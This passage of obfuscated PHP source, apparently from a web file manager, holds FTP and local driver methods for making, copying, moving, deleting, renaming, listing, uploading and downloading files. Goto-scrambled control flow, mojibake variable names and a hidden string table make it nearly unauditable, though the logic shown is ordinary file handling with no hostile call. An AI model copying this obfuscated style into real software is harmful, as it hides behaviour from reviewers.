($this->setContent($E°í‚Ÿ‹ƒ, $D¡ÉêóšË†)) { return $this->getPathOuter($E°í‚Ÿ‹ƒ); } return !1; } public function mkdir($CÂ¶ÇÌã”á, $AŠ½ÙÒ§´ë = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $CÂ¶ÇÌã”á = $this->iconvSystem($CÂ¶ÇÌã”á); if ($this->isFolder($CÂ¶ÇÌã”á) || @ftp_mkdir($this->connect, $CÂ¶ÇÌã”á)) { return $this->getPathOuter($CÂ¶ÇÌã”á); } if (!$this->mkdir($this->pathFather($CÂ¶ÇÌã”á))) { return !1; } if ($CÂ¶ÇÌã”á = @ftp_mkdir($this->connect, $CÂ¶ÇÌã”á)) { return $this->getPathOuter($CÂ¶ÇÌã”á); } return !1; } public function copyFile($aÕ¸‹¶†ïÔ, $eî„µ§Éšµ) { goto f¨™ÇŠÌãË; f¨™ÇŠÌãË: if (!$this->_isconn()) { return !1; } $fæÒá‚ã• = $this->pathThis($this->iconvSystem($aÕ¸‹¶†ïÔ)); $eƒƒŒç† = $this->tempFile($fæÒá‚ã•); goto A«Š¦¢Ø•‘; A«Š¦¢Ø•‘: $bç¯°í“İº = $this->iconvApp($eƒƒŒç†); $this->download($aÕ¸‹¶†ïÔ, $bç¯°í“İº); $DÅò•¾—òÖ = $this->upload($eî„µ§Éšµ, $bç¯°í“İº); goto EÃËÎ‡‚‹®; EÃËÎ‡‚‹®: $this->tempFileRemve($eƒƒŒç†); return $DÅò•¾—òÖ; goto dÄ§Şíù‹†; dÄ§Şíù‹†: } public function moveFile($fÙ´‰ËÑ´ó, $f‚‹§¡ïî) { if (!$this->_isconn()) { return !1; } $fÙ´‰ËÑ´ó = $this->iconvSystem($fÙ´‰ËÑ´ó); $f‚‹§¡ïî = $this->iconvSystem($f‚‹§¡ïî); $e†¹¨¼Äã = @ftp_rename($this->connect, $fÙ´‰ËÑ´ó, $f‚‹§¡ïî); return $e†¹¨¼Äã ? $this->getPathOuter($f‚‹§¡ïî) : !1; } public function delFile($b”ó¬ºôí) { if (!$this->_isconn()) { return !1; } $b”ó¬ºôí = $this->iconvSystem($b”ó¬ºôí); return @ftp_delete($this->connect, $b”ó¬ºôí); } public function delFolder($f¥ø—¢’ˆ‡) { if (!$this->_isconn()) { return !1; } $f¥ø—¢’ˆ‡ = $this->iconvSystem($f¥ø—¢’ˆ‡); $fÒ¼Ó¤Îæğ = $this->ftpList($f¥ø—¢’ˆ‡); if (!$fÒ¼Ó¤Îæğ) { return @ftp_rmdir($this->connect, $f¥ø—¢’ˆ‡); } foreach ($fÒ¼Ó¤Îæğ as $eŠÁíßÂ) { if ($this->isFolder($eŠÁíßÂ)) { $eŠÁíßÂ = $this->iconvApp($eŠÁíßÂ); $this->delFolder($eŠÁíßÂ); } else { @ftp_delete($this->connect, $eŠÁíßÂ); } } return @ftp_rmdir($this->connect, $f¥ø—¢’ˆ‡); } public function rename($f®ÕóÎĞÉŠ, $d áõŞåæ’) { goto EÅÂ¦Ó–”Š; b–È÷²Øò: $Dí¥Ä§¹¿³ = rtrim($Bï‚‘êÓ¥, $E¦˜·ØéÕ¨[8]) . $E¦˜·ØéÕ¨[8] . $Eºä…˜œæä; $Eó’ò¬Ìì = @ftp_rename($this->connect, $f®ÕóÎĞÉŠ, $Dí¥Ä§¹¿³); $Dí¥Ä§¹¿³ = $this->iconvApp($Dí¥Ä§¹¿³); goto Fˆ¬Ÿô•á¢; b¥èöÛ: $Eºä…˜œæä = $this->iconvSystem($Eºä…˜œæä); $f®ÕóÎĞÉŠ = $this->iconvSystem($f®ÕóÎĞÉŠ); $Bï‚‘êÓ¥ = $this->pathFather($f®ÕóÎĞÉŠ); goto b–È÷²Øò; Fˆ¬Ÿô•á¢: return $Eó’ò¬Ìì ? $this->getPathOuter($Dí¥Ä§¹¿³) : !1; goto AƒÉæ‰ÑŠŒ; EÅÂ¦Ó–”Š: $E¦˜·ØéÕ¨ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->_isconn()) { return !1; } $Eºä…˜œæä = $this->fileNameAuto($this->pathFather($f®ÕóÎĞÉŠ), $d áõŞåæ’); goto b¥èöÛ; AƒÉæ‰ÑŠŒ: } private function folderInfo($eÄ…ñËÚÛ½, $e³ÕöŸ™ïÔ = false) { goto bôóë–‘ÒÛ; bôóë–‘ÒÛ: $C®Ãˆ‡ñ¦¹ =& $_SERVER[Ö¹ñÒÁ²÷]; $b¥æ—Ô›ñ¨ = $this->getPathOuter(rtrim($eÄ…ñËÚÛ½, $C®Ãˆ‡ñ¦¹[8])); $Bİ¬Ô¹Ûì = $this->pathThis($b¥æ—Ô›ñ¨); goto Fà©íˆ˜£„; CìŠ¨¦œå‹: return $d®”½õ‡Ì; goto fŠÌÑâÌƒ; Fà©íˆ˜£„: $dñ†î×·Àœ = $this->iconvSystem($eÄ…ñËÚÛ½); if ($e³ÕöŸ™ïÔ) { return array($C®Ãˆ‡ñ¦¹[28] => $Bİ¬Ô¹Ûì, $C®Ãˆ‡ñ¦¹[75] => $b¥æ—Ô›ñ¨, $C®Ãˆ‡ñ¦¹[29] => $C®Ãˆ‡ñ¦¹[76]); } $d®”½õ‡Ì = array($C®Ãˆ‡ñ¦¹[28] => $Bİ¬Ô¹Ûì, $C®Ãˆ‡ñ¦¹[75] => $b¥æ—Ô›ñ¨, $C®Ãˆ‡ñ¦¹[29] => $C®Ãˆ‡ñ¦¹[76], $C®Ãˆ‡ñ¦¹[183] => 0, $C®Ãˆ‡ñ¦¹[106] => 0, $C®Ãˆ‡ñ¦¹[1148] => !0, $C®Ãˆ‡ñ¦¹[1149] => !0); goto CìŠ¨¦œå‹; fŠÌÑâÌƒ: } private function fileInfo($bÒ¯‹ç¶ê, $BšƒÌ—Ñƒ¥ = false) { goto fÒƒ¿ª£Â; fÒƒ¿ª£Â: $dšï™…œÜš =& $_SERVER[Ö¹ñÒÁ²÷]; $AÈÊëƒ…Üê = $this->getPathOuter(rtrim($bÒ¯‹ç¶ê, $dšï™…œÜš[8])); $câÁäÕ¯‚‘ = $this->pathThis($AÈÊëƒ…Üê); goto f¬–İà‹Ïµ; f¬–İà‹Ïµ: $F«¤†éÙêÕ = $this->iconvSystem($bÒ¯‹ç¶ê); if ($BšƒÌ—Ñƒ¥) { return array($dšï™…œÜš[28] => $câÁäÕ¯‚‘, $dšï™…œÜš[75] => $AÈÊëƒ…Üê, $dšï™…œÜš[29] => $dšï™…œÜš[163], $dšï™…œÜš[156] => $this->ext($bÒ¯‹ç¶ê), $dšï™…œÜš[77] => $this->size($bÒ¯‹ç¶ê)); } $aƒàßÆğÕÉ = array($dšï™…œÜš[28] => $câÁäÕ¯‚‘, $dšï™…œÜš[75] => $AÈÊëƒ…Üê, $dšï™…œÜš[29] => $dšï™…œÜš[163], $dšï™…œÜš[183] => 0, $dšï™…œÜš[106] => @ftp_mdtm($this->connect, $F«¤†éÙêÕ), $dšï™…œÜš[156] => $this->ext($bÒ¯‹ç¶ê), $dšï™…œÜš[77] => $this->size($bÒ¯‹ç¶ê), $dšï™…œÜš[1148] => !0, $dšï™…œÜš[1149] => !0); goto d‡ğ•‡ò†‘; d‡ğ•‡ò†‘: $aƒàßÆğÕÉ[$dšï™…œÜš[106]] = $aƒàßÆğÕÉ[$dšï™…œÜš[106]] > 0 ? $aƒàßÆğÕÉ[$dšï™…œÜš[106]] : 0; return $aƒàßÆğÕÉ; goto a¬õÌòİŸ¹; a¬õÌòİŸ¹: } public function size($CàÔ‹»†ê‚) { $FÊ¹ö‚° = $this->objectMeta($CàÔ‹»†ê‚); return $FÊ¹ö‚° ? $FÊ¹ö‚°[$_SERVER[Ö¹ñÒÁ²÷][77]] : 0; } public function info($dÎ¹Çùƒ˜¢) { if ($this->isFile($dÎ¹Çùƒ˜¢)) { return $this->fileInfo($dÎ¹Çùƒ˜¢, 0); } else { if ($this->isFolder($dÎ¹Çùƒ˜¢)) { return $this->folderInfo($dÎ¹Çùƒ˜¢); } } return !1; } public function exist($CÛ«³Íˆ¬À) { return $this->objectMeta($CÛ«³Íˆ¬À) ? !0 : !1; } public function isFile($AöÃ‰¸ö”“) { $E××³Å£š¼ =& $_SERVER[Ö¹ñÒÁ²÷]; $AÙ¸Ñ‰ï¯œ = $this->objectMeta($AöÃ‰¸ö”“); return $AÙ¸Ñ‰ï¯œ ? $AÙ¸Ñ‰ï¯œ[$E××³Å£š¼[29]] == $E××³Å£š¼[163] : !1; } public function isFolder($d’‚Ë©„Óé) { $AáÑ„ÍµÒ =& $_SERVER[Ö¹ñÒÁ²÷]; $c¹šÆÒÜƒì = $this->objectMeta($d’‚Ë©„Óé); return $c¹šÆÒÜƒì ? $c¹šÆÒÜƒì[$AáÑ„ÍµÒ[29]] == $AáÑ„ÍµÒ[76] : !1; } public function listPath($fœÒãˆ†¹, $C‚¹­ƒ»šŠ = false) { goto aêÀ¨ñ„‰; aêÀ¨ñ„‰: $eç«Ú ·à¹ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->_isconn()) { return !1; } $fœÒãˆ†¹ = $this->iconvSystem($fœÒãˆ†¹); goto e¸È¨öË§é; e¸È¨öË§é: $d«òë²‚é = $this->ftpList($fœÒãˆ†¹); $a¨¿ÓØá = array($eç«Ú ·à¹[74] => array(), $eç«Ú ·à¹[73] => array()); if (!$d«òë²‚é) { return $a¨¿ÓØá; } goto CËùêŒ×–Ú; CËùêŒ×–Ú: foreach ($d«òë²‚é as $fœÒãˆ†¹) { if ($this->isFolder($fœÒãˆ†¹)) { $a¨¿ÓØá[$eç«Ú ·à¹[74]][] = $this->folderInfo($fœÒãˆ†¹, $C‚¹­ƒ»šŠ); } else { $a¨¿ÓØá[$eç«Ú ·à¹[73]][] = $this->fileInfo($fœÒãˆ†¹, $C‚¹­ƒ»šŠ); } } return $a¨¿ÓØá; goto eÑç–¨¦ò¬; eÑç–¨¦ò¬: } public function has($A¢’¯Ê¡ß÷, $D¸Õ‹á…  = false, $A‡‰¨ˆ¢‰Í = true) { goto d¶ªæÚ–ÖÅ; Cë¶ˆŞ°ˆ: foreach ($c¶ŠÜé½—Ì as $A¢’¯Ê¡ß÷) { if ($A‡‰¨ˆ¢‰Í) { if (!$this->isFolder($A¢’¯Ê¡ß÷)) { return !0; } } else { if ($this->isFolder($A¢’¯Ê¡ß÷)) { return !0; } } } return !1; goto dŠğÈßæ; cÖ¾®ÁŒäã: $c¶ŠÜé½—Ì = $this->ftpList($A¢’¯Ê¡ß÷); if (!$c¶ŠÜé½—Ì) { return !1; } if ($D¸Õ‹á… ) { return array($bŒ¾Ä²·’[187] => 0, $bŒ¾Ä²·’[188] => count($c¶ŠÜé½—Ì)); } goto Cë¶ˆŞ°ˆ; d¶ªæÚ–ÖÅ: $bŒ¾Ä²·’ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->_isconn()) { return !1; } $A¢’¯Ê¡ß÷ = $this->iconvSystem($A¢’¯Ê¡ß÷); goto cÖ¾®ÁŒäã; dŠğÈßæ: } public function listAll($EğÛÁšËæ) { goto F„º½·õÊ‘; a‘š‡ù‹: $CµôÈÌäÖ = array($DŞ÷ô‘ŸÂ´[73] => array(), $DŞ÷ô‘ŸÂ´[74] => array()); $this->recursionFtpFiles($EğÛÁšËæ, $CµôÈÌäÖ); $F”¬ë˜ô±Ù = array(); goto D„ŸÙ¥ïáõ; D„ŸÙ¥ïáõ: foreach ($CµôÈÌäÖ[$DŞ÷ô‘ŸÂ´[74]] as $cÂØà°¡ÕŠ) { $F”¬ë˜ô±Ù[] = array($DŞ÷ô‘ŸÂ´[75] => $DŞ÷ô‘ŸÂ´[8] . trim(str_replace($EğÛÁšËæ, $DŞ÷ô‘ŸÂ´[33], $cÂØà°¡ÕŠ), $DŞ÷ô‘ŸÂ´[8]) . $DŞ÷ô‘ŸÂ´[8], $DŞ÷ô‘ŸÂ´[76] => 1, $DŞ÷ô‘ŸÂ´[77] => 0); } foreach ($CµôÈÌäÖ[$DŞ÷ô‘ŸÂ´[73]] as $bË²¢ µ÷º) { $F”¬ë˜ô±Ù[] = array($DŞ÷ô‘ŸÂ´[75] => $DŞ÷ô‘ŸÂ´[8] . trim(str_replace($EğÛÁšËæ, $DŞ÷ô‘ŸÂ´[33], $bË²¢ µ÷º), $DŞ÷ô‘ŸÂ´[8]), $DŞ÷ô‘ŸÂ´[76] => 0, $DŞ÷ô‘ŸÂ´[77] => $this->size($bË²¢ µ÷º)); } return $F”¬ë˜ô±Ù; goto Cë³ïñïŸæ; F„º½·õÊ‘: $DŞ÷ô‘ŸÂ´ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->_isconn()) { return !1; } $EğÛÁšËæ = $this->iconvSystem($EğÛÁšËæ); goto a‘š‡ù‹; Cë³ïñïŸæ: } public function getContent($C®øÛ¯¡ÚÚ) { if (!$this->_isconn()) { return !1; } $C®øÛ¯¡ÚÚ = $this->iconvSystem($C®øÛ¯¡ÚÚ); return $this->fileSubstr($C®øÛ¯¡ÚÚ); } public function setContent($F‘˜¿Áºã, $F„¶½å­¢ = '') { goto aÌì¨­Ì¾Ñ; d×çÁ©®©: return $EğŠÒÑ‹; goto D®«Ë…¸„è; aÌì¨­Ì¾Ñ: if (!$this->_isconn()) { return !1; } $Eî¨°İ¼Ò‰ = $this->pathThis($this->iconvSystem($F‘˜¿Áºã)); $f•…–£ÚÑÛ = $this->tempFile($Eî¨°İ¼Ò‰); goto CÈ´®ëºâñ; CÈ´®ëºâñ: file_put_contents($f•…–£ÚÑÛ, $F„¶½å­¢); $EğŠÒÑ‹ = $this->upload($F‘˜¿Áºã, $this->iconvApp($f•…–£ÚÑÛ)); $this->tempFileRemve($f•…–£ÚÑÛ); goto d×çÁ©®©; D®«Ë…¸„è: } public function fileSubstr($B¿£ˆŞ¬ß¾, $A¬Á¦›Àõ = 0, $b¶ˆ¼Õ˜÷½ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($B¿£ˆŞ¬ß¾, $A¬Á¦›Àõ, $b¶ˆ¼Õ˜÷½); } private function ftpRequest($FÒ‹•Ë§­æ, $CØï´­†… = 0, $D±‘äà¹ = false) { goto cğÎìëÉØŸ; F©Ä’šÚ¬ : curl_setopt($BÄ°»Ãµš¤, CURLOPT_RETURNTRANSFER, 1); $F‘ä˜õÊ˜È = curl_exec($BÄ°»Ãµš¤); curl_close($BÄ°»Ãµš¤); goto bæ‘¤È¾Âº; cğÎìëÉØŸ: $FÒ‹•Ë§­æ = $this->iconvSystem($FÒ‹•Ë§­æ); $dö¸¼³‡Ä… = $this->scheme . $this->host . $_SERVER[Ö¹ñÒÁ²÷][4] . $this->port; $BÄ°»Ãµš¤ = curl_init(); goto dìøŒ¬åÄ; bæ‘¤È¾Âº: return $F‘ä˜õÊ˜È; goto BÍ×õ ›ÛÜ; dìøŒ¬åÄ: curl_setopt($BÄ°»Ãµš¤, CURLOPT_URL, $dö¸¼³‡Ä… . $this->pathEncode($FÒ‹•Ë§­æ)); curl_setopt($BÄ°»Ãµš¤, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($D±‘äà¹) { $E±¯ø‹ğœã = $CØï´­†… + $D±‘äà¹ - 1; curl_setopt($BÄ°»Ãµš¤, CURLOPT_RANGE, "{$CØï´­†…}\55{$E±¯ø‹ğœã}"); } goto F©Ä’šÚ¬ ; BÍ×õ ›ÛÜ: } public function upload($aÈºã©ÃÄ‹, $EªÆ’ä£çõ, $dØ¾å‚—´ = false, $CÂß®Ê„—¬ = REPEAT_REPLACE) { goto bÅÉÓƒÅ§‚; c»ò……ÌµÖ: if ($d„ô×Íç‘– != FTP_FINISHED) { return !1; } return $this->getPathOuter($aÈºã©ÃÄ‹); goto D»Â¥¶ï˜¬; e…ÍÊ‰ÏÙ: $EªÆ’ä£çõ = $this->iconvSystem($EªÆ’ä£çõ); $d„ô×Íç‘– = ftp_nb_put($this->connect, $aÈºã©ÃÄ‹, $EªÆ’ä£çõ, FTP_BINARY); while ($d„ô×Íç‘– == FTP_MOREDATA) { $d„ô×Íç‘– = ftp_nb_continue($this->connect); } goto c»ò……ÌµÖ; bÅÉÓƒÅ§‚: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($aÈºã©ÃÄ‹))) { return !1; } $aÈºã©ÃÄ‹ = $this->iconvSystem($aÈºã©ÃÄ‹); goto e…ÍÊ‰ÏÙ; D»Â¥¶ï˜¬: } public function download($EâÂÏñôÅ, $Aê†Á’¶¸® = '') { goto B†‡²íôÕ; B†‡²íôÕ: if (!$this->_isconn()) { return !1; } $D»à÷ó‹½ = $this->pathFather($Aê†Á’¶¸®); if (!IO::mkdir($D»à÷ó‹½)) { return !1; } goto a¨–ïÕŠ; a¨–ïÕŠ: $EâÂÏñôÅ = $this->iconvSystem($EâÂÏñôÅ); $Aê†Á’¶¸® = $this->iconvSystem($Aê†Á’¶¸®); $cÖæ‹Ä´‹• = ftp_nb_get($this->connect, $Aê†Á’¶¸®, $EâÂÏñôÅ, FTP_BINARY); goto cïœË¿İÍ—; cïœË¿İÍ—: while ($cÖæ‹Ä´‹• == FTP_MOREDATA) { $cÖæ‹Ä´‹• = ftp_nb_continue($this->connect); } if ($cÖæ‹Ä´‹• != FTP_FINISHED) { return !1; } return $this->iconvApp($Aê†Á’¶¸®); goto CìÁÆÛè¿; CìÁÆÛè¿: } private function ftpList($a¡–±ùôŞ) { goto aÖ¿±Âòœ; C¼ºà­ÌÔ: $a¡–±ùôŞ = rtrim($a¡–±ùôŞ, $E…¦¬ìï¿Ô[8]) . $E…¦¬ìï¿Ô[8]; $A„¦Š™“¢ = @ftp_nlist($this->connect, $a¡–±ùôŞ); if ($A„¦Š™“¢ === !1) { $A„¦Š™“¢ = @ftp_rawlist($this->connect, $a¡–±ùôŞ); foreach ($A„¦Š™“¢ as $dõÈ‘ÕÓí => $cÉˆ·Âõª›) { $A„¦Š™“¢[$dõÈ‘ÕÓí] = end(explode($E…¦¬ìï¿Ô[1150], $cÉˆ·Âõª›)); } } goto C”¶ÏÊ‹Ÿî; aÖ¿±Âòœ: $E…¦¬ìï¿Ô =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->isFolder($a¡–±ùôŞ)) { return !1; } @ftp_chdir($this->connect, $E…¦¬ìï¿Ô[8]); goto C¼ºà­ÌÔ; C”¶ÏÊ‹Ÿî: $bà·ÈÔ„¥ = array(); foreach ($A„¦Š™“¢ as $E»§À¢ùÒ‹) { if ($E»§À¢ùÒ‹ == $E…¦¬ìï¿Ô[91] || $E»§À¢ùÒ‹ == $E…¦¬ìï¿Ô[1151]) { continue; } if (!strstr($E»§À¢ùÒ‹, $E…¦¬ìï¿Ô[8])) { $E»§À¢ùÒ‹ = $a¡–±ùôŞ . ltrim($E»§À¢ùÒ‹, $E…¦¬ìï¿Ô[8]); } $bà·ÈÔ„¥[] = $this->iconvApp($E»§À¢ùÒ‹); } return $bà·ÈÔ„¥; goto Bö…‰ĞÎì¢; Bö…‰ĞÎì¢: } private function recursionFtpFiles($Eº¹¾­à¤İ, &$dÍÆÂ“°¼ä) { $Dí¡…ˆùÊ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->_isconn()) { return !1; } if (!($A¢Ñ¨¹¹ƒõ = $this->ftpList($Eº¹¾­à¤İ))) { return !1; } foreach ($A¢Ñ¨¹¹ƒõ as $Eº¹¾­à¤İ) { if ($this->isFolder($Eº¹¾­à¤İ)) { $this->recursionFtpFiles($Eº¹¾­à¤İ, $dÍÆÂ“°¼ä); $dÍÆÂ“°¼ä[$Dí¡…ˆùÊ[74]][] = $Eº¹¾­à¤İ; } else { $dÍÆÂ“°¼ä[$Dí¡…ˆùÊ[73]][] = $Eº¹¾­à¤İ; } } } private function objectMeta($E¸•ÅÔ”Õñ) { goto EÔğôë ù„; Dˆ»Ü„¨¬î: return $a‡­Ä¡ù×; goto e¹ËƒÂ²Å; EÔğôë ù„: $f´÷‡¢×„… =& $_SERVER[Ö¹ñÒÁ²÷]; $AÑëŸèİˆŒ = $f´÷‡¢×„…[1152] . md5($E¸•ÅÔ”Õñ); $a‡­Ä¡ù× = Cache::get($AÑëŸèİˆŒ); goto Aßß‡ò¾¯õ; Aßß‡ò¾¯õ: if ($a‡­Ä¡ù× !== null && $a‡­Ä¡ù× !== !1) { return $a‡­Ä¡ù×; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $f´÷‡¢×„…[8]); goto f¯ğ´‚ÆË¿; f¯ğ´‚ÆË¿: $dòĞªĞÌ¢´ = @ftp_size($this->connect, $this->iconvSystem($E¸•ÅÔ”Õñ)); if ($dòĞªĞÌ¢´ != -1) { $a‡­Ä¡ù× = array($f´÷‡¢×„…[77] => $dòĞªĞÌ¢´, $f´÷‡¢×„…[29] => $f´÷‡¢×„…[163]); } else { $c«ëªÜ½·Ø = @ftp_chdir($this->connect, $this->iconvSystem($E¸•ÅÔ”Õñ)); $a‡­Ä¡ù× = $c«ëªÜ½·Ø ? array($f´÷‡¢×„…[77] => 0, $f´÷‡¢×„…[29] => $f´÷‡¢×„…[76]) : !1; } Cache::set($AÑëŸèİˆŒ, $a‡­Ä¡ù×, 0); goto Dˆ»Ü„¨¬î; e¹ËƒÂ²Å: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($b¦èÆó¿³) { if (substr($b¦èÆó¿³, 0, 2) == $_SERVER[Ö¹ñÒÁ²÷][1141]) { $b¦èÆó¿³ = BASIC_PATH . substr($b¦èÆó¿³, 2); } return $b¦èÆó¿³; } public function iconvApp($F˜Û»›’³–) { $B‚Ñ–Ş…—Ù =& $_SERVER[Ö¹ñÒÁ²÷]; global $config; return $this->iconvTo($F˜Û»›’³–, $config[$B‚Ñ–Ş…—Ù[1139]], $config[$B‚Ñ–Ş…—Ù[1138]]); } public function iconvSystem($dÈÚŠù¢”ê) { $C‡çìÛ¨ÈÈ =& $_SERVER[Ö¹ñÒÁ²÷]; global $config; return $this->iconvTo($dÈÚŠù¢”ê, $config[$C‡çìÛ¨ÈÈ[1138]], $config[$C‡çìÛ¨ÈÈ[1139]]); } public function getPathOuter($a—‡ò¡ìÆ) { goto eÕàá£ÌèÏ; EÊ½ •Èˆ: $a—‡ò¡ìÆ = KodIO::clear($a—‡ò¡ìÆ); $a—‡ò¡ìÆ = substr($a—‡ò¡ìÆ, strlen($E„–ÈÄ“¹)); if (empty($this->pathDriver)) { return $a—‡ò¡ìÆ; } goto bÓäô¼âğõ; bÓäô¼âğõ: return $this->pathDriver . $FòÉ§ÈÉ˜°[8] . ltrim($a—‡ò¡ìÆ, $FòÉ§ÈÉ˜°[8]); goto cßïùŠ†èÖ; eÕàá£ÌèÏ: $FòÉ§ÈÉ˜° =& $_SERVER[Ö¹ñÒÁ²÷]; $E„–ÈÄ“¹ = $this->iconvApp($this->pathBase); $a—‡ò¡ìÆ = $this->iconvApp($a—‡ò¡ìÆ); goto c¾½£Ù¡÷; c¾½£Ù¡÷: if (substr($E„–ÈÄ“¹, 0, 2) == $FòÉ§ÈÉ˜°[1141]) { $E„–ÈÄ“¹ = BASIC_PATH . substr($E„–ÈÄ“¹, 2); } if (substr($a—‡ò¡ìÆ, 0, 2) == $FòÉ§ÈÉ˜°[1141]) { $a—‡ò¡ìÆ = BASIC_PATH . substr($a—‡ò¡ìÆ, 2); } $E„–ÈÄ“¹ = KodIO::clear($E„–ÈÄ“¹); goto EÊ½ •Èˆ; cßïùŠ†èÖ: } public function mkfile($b·â…ÆòÁ, $e„Å‘´³Òö = '', $c„—Õ÷’µ– = REPEAT_RENAME) { $b·â…ÆòÁ = $this->iconvSystem($b·â…ÆòÁ); @touch($b·â…ÆòÁ); if ($e„Å‘´³Òö) { file_put_contents($b·â…ÆòÁ, $e„Å‘´³Òö); } return is_file($b·â…ÆòÁ) ? $this->getPathOuter($b·â…ÆòÁ) : !1; } public function mkdir($fç‚ğåì¯…, $f“’ÉŒŒ„Î = REPEAT_SKIP) { $fç‚ğåì¯… = $this->iconvSystem($fç‚ğåì¯…); if (is_dir($fç‚ğåì¯…)) { return $this->getPathOuter($fç‚ğåì¯…); } @mkdir($fç‚ğåì¯…, 511, !0); return is_dir($fç‚ğåì¯…) ? $this->getPathOuter($fç‚ğåì¯…) : !1; } public function copyFile($a¼±ØÎ¤¯, $B†·¥¶„¹¶) { $this->mkdir($this->pathFather($B†·¥¶„¹¶)); $a¼±ØÎ¤¯ = $this->iconvSystem($a¼±ØÎ¤¯); $B†·¥¶„¹¶ = $this->iconvSystem($B†·¥¶„¹¶); $A»Š„‡¿ä = @copy($a¼±ØÎ¤¯, $B†·¥¶„¹¶); return $A»Š„‡¿ä ? $this->getPathOuter($B†·¥¶„¹¶) : !1; } public function moveFile($d—øô¤ìÛ³, $eœ¯‹—îÖ™) { $this->mkdir($this->pathFather($eœ¯‹—îÖ™)); $d—øô¤ìÛ³ = $this->iconvSystem($d—øô¤ìÛ³); $eœ¯‹—îÖ™ = $this->iconvSystem($eœ¯‹—îÖ™); $càÈæÖÄŒÓ = intval(@rename($d—øô¤ìÛ³, $eœ¯‹—îÖ™)); if (!$càÈæÖÄŒÓ) { if ($càÈæÖÄŒÓ = intval(@copy($d—øô¤ìÛ³, $eœ¯‹—îÖ™))) { @unlink($d—øô¤ìÛ³); } } return $càÈæÖÄŒÓ ? $this->getPathOuter($eœ¯‹—îÖ™) : !1; } public function delFile($c´‹‰ˆ¦Ñ©) { $c´‹‰ˆ¦Ñ© = $this->iconvSystem($c´‹‰ˆ¦Ñ©); if (!@unlink($c´‹‰ˆ¦Ñ©)) { @chmod($c´‹‰ˆ¦Ñ©, 511); if (!@unlink($c´‹‰ˆ¦Ñ©)) { return !1; } } else { return !0; } } public function delFolder($eö”ÇÄ‘ãï) { goto e“ÊºæßÔÁ; e“ÊºæßÔÁ: $C¬áÈ ‚ =& $_SERVER[Ö¹ñÒÁ²÷]; $eö”ÇÄ‘ãï = $this->iconvSystem($eö”ÇÄ‘ãï); if (!is_dir($eö”ÇÄ‘ãï)) { return !0; } goto FËîÆ¡Ÿ»; FËîÆ¡Ÿ»: if (!($fğèõªÕÎ½ = opendir($eö”ÇÄ‘ãï))) { return !1; } while (($FÜĞ¡²çˆ = readdir($fğèõªÕÎ½)) !== !1) { if ($FÜĞ¡²çˆ == $C¬áÈ ‚[91] || $FÜĞ¡²çˆ == $C¬áÈ ‚[1151]) { continue; } $F¾Ô½ã‰–Œ = $eö”ÇÄ‘ãï . $C¬áÈ ‚[8] . $FÜĞ¡²çˆ; if (!is_dir($F¾Ô½ã‰–Œ)) { if (!unlink($F¾Ô½ã‰–Œ)) { chmod($F¾Ô½ã‰–Œ, 511); if (!unlink($F¾Ô½ã‰–Œ)) { return !1; } } } else { chmod($F¾Ô½ã‰–Œ, 511); $F¾Ô½ã‰–Œ = $this->iconvApp($F¾Ô½ã‰–Œ); if (!$this->delFolder($F¾Ô½ã‰–Œ)) { return !1; } } } closedir($fğèõªÕÎ½); goto Eºéæ©ß; Eºéæ©ß: return rmdir($eö”ÇÄ‘ãï); goto FæÅÔ·îç; FæÅÔ·îç: } public function rename($dŞòÓÄâÈÚ, $bÄÈßµÒ¦ì) { goto AÁ‚ì–¬á; EŸ¤†ÇÜäö: $aèƒ‘Ã¸ëö = @rename($dŞòÓÄâÈÚ, $b¹ğÕô¬”Š); $b¹ğÕô¬”Š = $this->iconvApp($b¹ğÕô¬”Š); return $aèƒ‘Ã¸ëö ? $this->getPathOuter($b¹ğÕô¬”Š) : !1; goto bêéùãíĞÜ; B„Î»×ß‚¿: $dŞòÓÄâÈÚ = $this->iconvSystem($dŞòÓÄâÈÚ); $a§á£ßñâì = $this->pathFather($dŞòÓÄâÈÚ); $b¹ğÕô¬”Š = rtrim($a§á£ßñâì, $F¾Œ›á‚áë[8]) . $F¾Œ›á‚áë[8] . $eã‰Çº¾¬ç; goto EŸ¤†ÇÜäö; AÁ‚ì–¬á: $F¾Œ›á‚áë =& $_SERVER[Ö¹ñÒÁ²÷]; $eã‰Çº¾¬ç = $this->fileNameAuto($this->pathFather($dŞòÓÄâÈÚ), $bÄÈßµÒ¦ì); $eã‰Çº¾¬ç = $this->iconvSystem($eã‰Çº¾¬ç); goto B„Î»×ß‚¿; bêéùãíĞÜ: } public function size($e‡è„­ƒ¼‰) { $e‡è„­ƒ¼‰ = $this->iconvSystem($e‡è„­ƒ¼‰); return (double) abs(sprintf($_SERVER[Ö¹ñÒÁ²÷][1153], @filesize($e‡è„­ƒ¼‰))); } public function info($BÊò„ÛÆ†Õ) { $BÊò„ÛÆ†Õ = $this->iconvSystem($BÊò„ÛÆ†Õ); if ($this->isFolder($BÊò„ÛÆ†Õ)) { return $this->folderInfo($BÊò„ÛÆ†Õ); } else { if ($this->isFile($BÊò„ÛÆ†Õ)) { return $this->fileInfo($BÊò„ÛÆ†Õ); } } return !1; } protected function infoChildren($Dø«ó‹åŸá, &$CŞÃáçˆ£Ë, $Bßá¾·°ã = true) { $cÊ¤§Ç³„¶ =& $_SERVER[Ö¹ñÒÁ²÷]; $Dø«ó‹åŸá = rtrim($Dø«ó‹åŸá, $cÊ¤§Ç³„¶[8]) . $cÊ¤§Ç³„¶[8]; if ($Bßá¾·°ã) { check_abort(); $Dø«ó‹åŸá = $this->iconvSystem($Dø«ó‹åŸá); } if (!($a¥Ú¯…½èÈ = @opendir($Dø«ó‹åŸá))) { return; } while (($d°¬‚®…¾é = readdir($a¥Ú¯…½èÈ)) !== !1) { if ($d°¬‚®…¾é == $cÊ¤§Ç³„¶[91] || $d°¬‚®…¾é == $cÊ¤§Ç³„¶[1151]) { continue; } $Dë³æ‚å©Æ = $Dø«ó‹åŸá . $d°¬‚®…¾é; 